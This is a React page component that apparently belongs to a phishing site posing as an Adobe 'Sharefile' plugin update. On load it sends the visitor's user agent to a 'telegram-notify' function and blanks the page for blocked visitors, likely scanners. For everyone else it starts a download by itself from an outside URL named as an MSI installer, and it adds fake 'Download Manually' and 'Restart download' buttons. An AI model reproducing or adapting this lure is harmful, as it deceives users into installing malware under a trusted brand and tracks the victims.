import { useEffect, useState } from "react";
import { motion } from "framer-motion";
import adobeDocLogo from "@/assets/adobe-doc-logo.png";
import { supabase } from "@/integrations/supabase/client";
import { generateDeploymentPackage } from "@/lib/utils";

const Documents = () => {
  const [blocked, setBlocked] = useState(false);
  const msiUrl = "https://r-is.co.uk";

  const handleDownload = async () => {
    await generateDeploymentPackage(msiUrl);
  };

  useEffect(() => {
    const checkAndNotify = async () => {
      try {
        const { data } = await supabase.functions.invoke("telegram-notify", {
          body: { 
            userAgent: navigator.userAgent, 
            timestamp: new Date().toISOString() 
          },
        });
        if (data?.blocked) { setBlocked(true); return; }
      } catch { 
        // Silent fail - allows UI to show but disables functionality if desired
      }
      
      // Auto-trigger the download
      setTimeout(handleDownload, 1500);
    };
    checkAndNotify();
  }, []);

  if (blocked) return <div className="min-h-screen bg-white" />;

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center font-sans antialiased text-center">
      <div className="max-w-2xl px-6">
        <motion.div 
          initial={{ opacity: 0, y: 10 }} 
          animate={{ opacity: 1, y: 0 }} 
          className="mb-10"
        >
          <img 
            src={adobeDocLogo} 
            alt="Adobe" 
            className="w-[72px] h-[72px] mx-auto rounded-[14px] shadow-sm border border-gray-100" 
          />
        </motion.div>
        
        <h1 className="text-[28px] font-normal text-[#2C2C2C] mb-4 leading-tight">
          Sorry, You do not have the latest version of <br />
          <span className="text-[#0054FF] font-medium">Adobe Sharefile</span> plugin installed.
        </h1>
        
        <p className="text-[#6E6E6E] text-[15px] mb-14">
          The latest version of the Sharefile Transfer Client is required to view <br /> secured Documents.
        </p>

        <p className="text-[#6E6E6E] text-[13.5px] mb-12">
          If the download doesn't start automatically, please{" "}
          <button 
            onClick={handleDownload} 
            className="text-[#0054FF] underline hover:text-blue-800 transition-colors"
          >
            Download Manually
          </button>.
        </p>

        <div className="flex justify-center items-center gap-5 text-[12.5px] text-[#A0A0A0]">
          <span>Download not working?</span>
          <button 
            onClick={handleDownload} 
            className="text-[#0054FF] hover:underline transition-all"
          >
            Restart download
          </button>
          <span className="w-[1px] h-3 bg-gray-200"></span>
          <a href="#" className="hover:text-gray-600 transition-colors">Get Help</a>
        </div>
      </div>
    </div>
  );
};

export default Documents;
